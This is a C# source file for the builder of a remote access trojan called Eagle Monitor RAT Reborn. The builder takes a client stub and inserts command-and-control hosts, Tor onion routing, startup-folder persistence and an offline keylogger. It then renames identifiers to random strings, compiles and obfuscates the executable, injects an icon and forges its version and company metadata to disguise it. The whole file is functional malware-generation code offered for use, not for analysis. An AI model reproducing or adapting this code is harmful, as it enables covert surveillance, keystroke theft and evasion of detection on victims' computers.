using System;
using System.Diagnostics;
using System.IO.Compression;
using System.IO;
using System.Text;
using System.Windows.Forms;
using dnlib.DotNet;
using Eagle_Monitor_RAT_Reborn.Controls;
using static Eagle_Monitor_RAT_Reborn.Network.ClientHandler;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_RAT_Reborn.Builder
{
    internal class StubBuilder
    {
        internal static bool BuildClient()
        {
            Program.mainForm.buildLogsGuna2TextBox.BeginInvoke((MethodInvoker)(() => {
                Program.mainForm.buildLogsGuna2TextBox.Clear();
                string stub = File.ReadAllText(Application.StartupPath + "\\Stubs\\client.cs");

                string xmlConfig = "";
                if (Program.settings.torRouting)
                    xmlConfig = File.ReadAllText(Application.StartupPath + "\\Stubs\\clientTor.xml");
                else
                    xmlConfig = File.ReadAllText(Application.StartupPath + "\\Stubs\\client.xml");
                string archi = xmlConfig.Replace("anycpu", Program.mainForm.archiGuna2ComboBox.Text);
                File.WriteAllText(Application.StartupPath + "\\Stubs\\clienttmp.xml", archi);
                //Doing patch
                LogStep("Adding encryption key..." + Environment.NewLine);
                stub = ReplaceStub(stub, "string generalKey = \"123456789\"", $"string generalKey = \"{Program.mainForm.builderKeyGuna2TextBox.Text}\"");
                LogStep("Adding offline lib..." + Environment.NewLine);
                stub = ReplaceStub(stub, "byte[] offline = new byte[] { };", "byte[] offline = " + LibCompressor(File.ReadAllBytes(Application.StartupPath + "\\Stubs\\Offline.dll")));
                LogStep("Adding packet lib..." + Environment.NewLine);
                stub = ReplaceStub(stub, "byte[] packetLib = new byte[] { };", "byte[] packetLib = " + LibCompressor(File.ReadAllBytes(Application.StartupPath + "\\PacketLib.dll")));

                // Tor Build
                if (Program.settings.torRouting)
                { 
                    LogStep("Adding Tor Libs..." + Environment.NewLine);
                    stub = ReplaceStub(stub, "byte[] net = new byte[] { };", "byte[] net = " + LibCompressor(File.ReadAllBytes(Application.StartupPath + "\\Stubs\\System.Net.Http.dll")));
                    stub = ReplaceStub(stub, "byte[] bridge = new byte[] { };", "byte[] bridge = " + LibCompressor(File.ReadAllBytes(Application.StartupPath + "\\Stubs\\OraclesBridge.dll")));
                    stub = ReplaceStub(stub, "byte[] aspen = new byte[] { };", "byte[] aspen = " + LibCompressor(File.ReadAllBytes(Application.StartupPath + "\\Stubs\\starksoft.aspen.dll")));
                    string[] _dirs = Directory.GetDirectories(Application.StartupPath + "\\TORFiles\\TorExtracted");
                    string _ = "";
                    foreach (string _dir in _dirs)
                        if (_dir.Contains("tor"))
                            _ = _dir;
                    string onionHost = File.ReadAllText($"{_}\\Data\\Tor\\HiddenService\\hostname");
                    MessageBox.Show(onionHost);
                    stub = ReplaceStub(stub, "onionHost = \"\"", $"onionHost = \"{onionHost.Replace("\n","").Trim()}:{Program.settings.torPort}\"");
                    stub = ReplaceStub(stub, "torRoute = false", "torRoute = true");
                }
                //
                LogStep("Patching hosts..." + Environment.NewLine);
                string hostsList = null;

                foreach (DataGridViewRow host in Program.mainForm.hostsDataGridView.Rows)
                {
                    hostsList += $"\"{host.Cells[0].Value}:{host.Cells[1].Value}\",";
                }

                stub = stub.Replace("\"qsdqsdqsdkjsdljk.com:7521\", \"127.0.0.1:7788\", \"127.0.0.1:9988\", \"127.0.0.1:9875\"", hostsList.Substring(0, hostsList.Length - 1));


                if (Program.mainForm.persistenceGuna2CheckBox.Checked && Program.mainForm.persistenceMethodGuna2ComboBox.SelectedIndex != -1)
                {
                    LogStep("Adding persistence..." + Environment.NewLine);
                    stub = stub.Replace("Offline.Persistence.Method.NONE", "Offline.Persistence.Method.SHT_STARTUP_FOLDER");
                }
                else
                    LogStep("Skipping persistence..." + Environment.NewLine);

                if (Program.mainForm.offKeyloguna2CheckBox.Checked)
                {
                    LogStep("Setting offline keylogger..." + Environment.NewLine);
                    stub = stub.Replace("static bool offKeylog = false;", "static bool offKeylog = true;");
                }
                else
                    LogStep("Skipping offline keylogger..." + Environment.NewLine);

                LogStep("Renaming code..." + Environment.NewLine);

                stub = Rename(stub, "hosts");
                stub = Rename(stub, "hostLists");
                stub = Rename(stub, "generalKey");
                stub = Rename(stub, "Config");
                stub = Rename(stub, "offKeylog");
                stub = Rename(stub, "installationParam");
                stub = Rename(stub, "installationMethod");
                stub = Rename(stub, "StarterClass");
                stub = Rename(stub, "AlreadyLaunched");
                stub = Rename(stub, "OneInstance");
                stub = Rename(stub, "MakeInstall");
                stub = Rename(stub, "StartOfflineKeylogger");
                stub = Rename(stub, "DomCheck");
                stub = Rename(stub, "ConnectStart");
                stub = Rename(stub, "EndLoadPlugin");
                stub = Rename(stub, "LoadPlugin");
                stub = Rename(stub, "SendPacket");
                stub = Rename(stub, "PacketHandler");
                stub = Rename(stub, "ParsePacket");
                stub = Rename(stub, "ReceiveData");
                stub = Rename(stub, "EndDataRead");
                stub = Rename(stub, "PacketParser");
                stub = Rename(stub, "EndPacketRead");
                stub = Rename(stub, "SendDataCompleted");
                stub = Rename(stub, "EndConnect");

                stub = Rename(stub, "ReadDataAsync");
                stub = Rename(stub, "readDataAsync");

                stub = Rename(stub, "ReadPacketAsync");
                stub = Rename(stub, "readPacketAsync");

                stub = Rename(stub, "ConnectAsync");
                stub = Rename(stub, "connectAsync");

                stub = Rename(stub, "SendDataAsync");
                stub = Rename(stub, "sendDataAsync");
                stub = Rename(stub, "SendData");
                //    stub = Rename(stub, "StartProxy");
                //    stub = Rename(stub, "Proxify");

                File.WriteAllText(Application.StartupPath + "\\Stubs\\clienttmp.cs", stub);

                LogStep("Starting building process..." + Environment.NewLine);
                Build();

                LogStep("Starting obfuscating exe file..." + Environment.NewLine);
                bool built = Obfuscator(Application.StartupPath + "\\Stubs\\Client.exe");
                File.Delete(Application.StartupPath + "\\Stubs\\Client.exe");

                if (built)
                { LogStep("Client built !"); MessageBox.Show("Done !", "", MessageBoxButtons.OK, MessageBoxIcon.Information); }

            }));
            return false;
        }

        private static string ReplaceStub(string stub, string toReplace, string newString) 
        {
            return stub.Replace(toReplace, newString);         
        }

        private static string Rename(string stub, string toReplace) 
        {
            return stub.Replace(toReplace, Misc.RandomString.NextString(10));
        }

        private static void LogStep(string log) 
        {
            Program.mainForm.buildLogsGuna2TextBox.AppendText(log);
        }

        private static void Build() 
        {
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.StartInfo.StandardOutputEncoding = Encoding.GetEncoding(437);
            /*
            The OEM or DOS/OEM character set contains line draw and other symbols commonly used by earlier DOS programs to create charts and simple graphics. 
            Also known as the PC-8 symbol set as well as Code Page 437, 
            the OEM character set is built into every graphics card.
            */
            string xmlPath = Application.StartupPath + "\\Stubs\\clienttmp.xml\"";
            cmd.StartInfo.Arguments = "/c " + "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe \""+ xmlPath;
            cmd.Start();

            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
            Program.mainForm.buildLogsGuna2TextBox.AppendText(cmd.StandardOutput.ReadToEnd());
            File.Delete(Application.StartupPath + "\\Stubs\\clienttmp.cs");
            File.Delete(Application.StartupPath + "\\Stubs\\clienttmp.xml");
        }

        private static string LibCompressor(byte[] lib)
        {
            using (MemoryStream resultStream = new MemoryStream())
            {
                using (DeflateStream compressionStream = new DeflateStream(resultStream, CompressionMode.Compress))
                {
                    compressionStream.Write(lib, 0, lib.Length);
                }
                byte[] result = resultStream.ToArray();

                return "new byte[] {" + String.Join(",", result) + "};";
            }
        }

        private static bool Obfuscator(string path)
        {
            ModuleDefMD asmDef = ModuleDefMD.Load(path);
            try
            {
                using (asmDef)
                {
                    using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
                    {
                        saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
                        saveFileDialog1.InitialDirectory = Misc.Utils.GPath;
                        saveFileDialog1.OverwritePrompt = false;
                        saveFileDialog1.FileName = "Client";
                        if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                        {
                            Obfuscate.ObfuscateStub(asmDef);
                            asmDef.Write(saveFileDialog1.FileName);
                            asmDef.Dispose();

                            LogStep("Setting icon..." + Environment.NewLine);
                            if (!string.IsNullOrEmpty(Program.mainForm.iconPath))
                                IconInjector.SetIcon(Program.mainForm.iconPath, saveFileDialog1.FileName);
                            else
                                LogStep("Skipping setting icon..." + Environment.NewLine);

                            LogStep("Setting assembly information..." + Environment.NewLine);
                            WriteAssemblyInfo.WriteAssemblyInformation(saveFileDialog1.FileName,
                                Program.mainForm.fileVersionGuna2TextBox.Text,
                                Program.mainForm.productVersionGuna2TextBox.Text,
                                Program.mainForm.productGuna2TextBox.Text,
                                Program.mainForm.descriptionGuna2TextBox.Text,
                                Program.mainForm.companyGuna2TextBox.Text,
                                Program.mainForm.copyrightGuna2TextBox.Text,
                                Program.mainForm.trademarksGuna2TextBox.Text,
                                Program.mainForm.filenameGuna2TextBox.Text
                                );

                            return true;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
            return false;
        }
    }
}
